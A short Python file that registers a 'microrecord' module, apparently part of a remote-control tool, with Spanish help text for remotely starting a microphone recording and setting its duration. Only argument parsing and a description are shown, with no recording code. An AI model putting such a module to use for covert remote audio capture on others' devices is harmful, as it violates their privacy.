from utils.UI import evieModule

parser = evieModule.CreateComplement('microrecord')

parser.set_description(
        '\n' + 'Instrucciones para su uso de forma remota:' + '\n\n'
        '\t' + 'Función: record_iter:' + '\n\n'
        '\t' + ' Inicia una grabación del micrófono.' + '\n\n'
        '\t\t' + 'Parámetros:' + '\n\n'
        '\t\t' + 'total : int:10  : La duración de la grabación' + '\n'
        '\t\t' + 'chunk : chunk:5 : Las unidades de memoria' + '\n'
        )
parser.set_current_version('1.0.0')
parser.set_version('1.0.0', 'Nicolas VERDIER', ['https://github.com/n1nj4sec', 'contact@n1nj4.eu'])

parser.add(['-help'], 'help', 'Muestra la ayuda y sale')

parser.parse_args()
